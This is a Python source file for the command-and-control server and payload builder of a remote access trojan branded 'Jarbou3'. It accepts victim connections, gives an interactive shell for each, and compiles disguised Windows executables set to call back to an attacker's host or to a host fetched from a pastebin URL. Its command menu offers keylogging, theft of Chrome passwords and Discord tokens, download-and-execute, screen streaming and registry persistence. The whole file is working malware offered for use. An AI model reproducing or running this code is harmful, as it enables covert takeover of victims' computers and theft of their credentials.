import socket
import  requests
import json
import os
import threading
from os.path import isfile

f = open('serverport.txt', 'r').read()
if f == "{}" or "":
    serverport = input('entre serverport:')
    with open('serverport.txt', 'w') as port:
        port.write(serverport)


def replace_string(filename, old_string, new_string):
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            return

    with open(filename, 'w') as f:
        s = s.replace(old_string, new_string)
        f.write(s)


def build():
    try:
        import socket
        import json
        import subprocess
        import os
        import pyautogui
        import threading
        import shutil
        import sys
        from os.path import isfile
        import random
        import string
        from requests import get
        from webbrowser import open as op
        import getpass
        import ctypes
        from pynput.keyboard import Listener
        import time
        import win32crypt
        import sqlite3
        import base64
        from PIL import ImageGrab
        from urllib.request import Request, urlopen

        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives.ciphers import (
            Cipher, algorithms, modes)
    except Exception as moderror:
        print(moderror)
        print('run installed.bat and restart the tool')
        exit()
    else:
        print("""
1) lhost and lport
2) grab host and port from pastebin ex:127.0.0.1:4444
        """)
        c = int(input('choose:'))
        if c == 1:
            lhost = input('entre your host:')
            lport = input('entre lport:')
            icon = ""
            while isfile(icon) == False:
                icon = input('entre your icon path:')
            os.system('powershell -c cd stub; cp jarbou3.py ..')
            replace_string('jarbou3.py', '$lhost', lhost)
            replace_string('jarbou3.py', '$lport', lport)

            print('[+]Compiling')
            os.system('pyinstaller --noconfirm --onefile --windowed --icon "' + icon + '"  "jarbou3.py"')
            os.remove('jarbou3.py')
            os.system('powershell -c cd dist; cp jarbou3.exe ..')
        elif c == 2:
            URL = input('entre you url:')
            u = requests.get(URL).text
            sp = u.split(':')
            print('host is:'+sp[0]+'\n port is:'+sp[1])
            os.system('powershell -c cd stub; cp jarbou3-pastebin.py ..')
            ask = input('is  those your host and port(y/n):')
            if ask == 'y':
                replace_string('jarbou3-pastebin.py','$pastebin',URL)
                icon = ''
                while isfile(icon) == False:
                    icon = input('entre your icon path:')
                print('[+]Compiling')
                os.system('pyinstaller --noconfirm --onefile --windowed --icon "' + icon + '"  "jarbou3-pastebin.py"')

                os.system('powershell -c cd dist; cp jarbou3-pastebin.exe ..')
            else:
                os.remove('jarbou3-pastebin.py')
                build()
        else:
            build()




def banner():
    print("""
     ___  _______  ______    _______  _______  __   __  _______ 
    |   ||   _   ||    _ |  |  _    ||       ||  | |  ||       |
    |   ||  |_|  ||   | ||  | |_|   ||   _   ||  | |  ||___    |
    |   ||       ||   |_||_ |       ||  | |  ||  |_|  | ___|   |
 ___|   ||       ||    __  ||  _   | |  |_|  ||       ||___    |
|       ||   _   ||   |  | || |_|   ||       ||       | ___|   |
|_______||__| |__||___|  |_||_______||_______||_______||_______|   
    By youhacker55


    """)


def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def upload_file(target, file_name):
        f = open(file_name, 'rb')
        target.send(f.read())




def download_file(target, file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def target_communication(target, ip):
    count = 0
    while True:
        command = input('youhacker-Shell~%s: ' % str(ip))
        reliable_send(target, command)
        if command == 'quit':
            break

        elif command == 'back':
            break
        elif command == 'clear':
            os.system('cls')
        elif command[:6] == 'upload':
            if isfile(command[7:]) == True:
                upload_file(target, command[7:])
            else:
               pass
        elif command == 'ngroksetup':
            upload_file(target,'scripts\\ngrok.exe')
        elif command[:8] == 'download':
            download_file(target, command[9:])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d' % (count) + '.png', 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1
        elif command == 'help':
            print(('''\n
            quit                                --> Quit Session With The Target
            clear                               --> Clear The Screen
            cd path                             --> Changes Directory On Target System
            upload filename                    --> Upload File To The target Machine
            download filename                   --> Download File From Target Machine
            keylog_start                        --> Start The Keylogger
            keylog_dump                         --> Read keylogged logs
            keylog_stop                         -->  Stop keylogger
            open_link                            --> Open a URL
            screenshot                          -->  make a screenshot
            dexec                               --> download and execute file from the internet
            start                               --> execute a programme
            run-pwr                            --> execute powershell command
            msgbox                             --> show msgbox ex:msgbox|yourtitle|yourtext
            chrome_recon                       --> recover Chrome Passwords
            disteal                            --> Get Discord tokens
            priv                               --> Check User Priv
            sysinfo                            --> get system information
            say                                --> make Target Computer talk ex: say something
            clip                               --> change data in clipoard
            pslist                             --> print the running process on the client
            kill                               --> kill running process with pid example:kill 1009
            screenshare                        --> stream client screen
            ssharescreen                       --> stopstreaming
            ngroksetup                         --> download ngrok on the client
            changepolicy                       --> execute powershell scripts
            cwallpaper                         --> change wallpaper
            persistence *RegName* *fileName*    --> Create Persistence In Registry'''))
        elif command[:11] == 'screenshare':
            upload_file(target,'scripts\\screenshare.ps1')
        elif command[:10] == 'cwallpaper':
                upload_file(target,command[11:])

        else:
            result = reliable_recv(target)
            print(result)


def accept_connections():
    global clients
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print((str(ip) + ' has connected!'))
            clients += 1


        except:
            pass


clients = 0
targets = []
ips = []
stop_flag = False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
p = open('serverport.txt', 'r').read()
sock.bind(('', int(p)))
sock.listen(5)
t1 = threading.Thread(target=accept_connections)
t1.start()
banner()
print('[+] Waiting For The Incoming Connections ...')

while True:
    command = input('youhackerC&C: ')
    if command == 'hacked':
        counter = 0

        for ip in ips:
            print('Session ' + str(counter) + ' --- ' + str(ip))
            counter += 1
    elif command == 'clear':
        os.system('cls')
    elif command[:7] == 'connect':
        try:
            num = int(command[8:])
            tarnum = targets[num]
            tarip = ips[num]
            target_communication(tarnum, tarip)
        except:
            print('[-] No Session for that number')
    elif command == 'help':
        print("""
    banner          --> print the banner
    connect         --> connect to target
    sendall         --> send command to all targets
    hacked          --> see connected targets
    exit            --> exit the C&C
    kill            --> kill session
    rmlist          --> remove disconnected target from list
    clear           --> clear the screen
            """)
    elif command == 'banner':
        banner()
    elif command == 'build':
        build()
    elif command[:6] == 'rmlist':
        try:
            targ = targets[int(command[7:])]
            ip = ips[int(command[7:])]
            targets.remove(targ)
            ips.remove(ip)
        except:
            print('This session not Available')

    elif command == 'exit':
        for target in targets:
            reliable_send(target, 'quit')
            target.close()
        sock.close()
        stop_flag = True
        t1.join()
        break
    elif command == 'clear':
        os.system('cls')
    elif command[:4] == 'kill':
        targ = targets[int(command[5:])]
        ip = ips[int(command[5:])]
        reliable_send(targ, 'quit')
        targ.close()
        targets.remove(targ)
        ips.remove(ip)

    elif command[:7] == 'sendall':
        x = len(targets)
        print(x)
        i = 0
        try:
            while i < x:
                tarnumber = targets[i]
                print(tarnumber)
                reliable_send(tarnumber, command)
                i += 1
        except:
            print('Failed')
    else:
        print('[!!] Command Doesnt Exist')
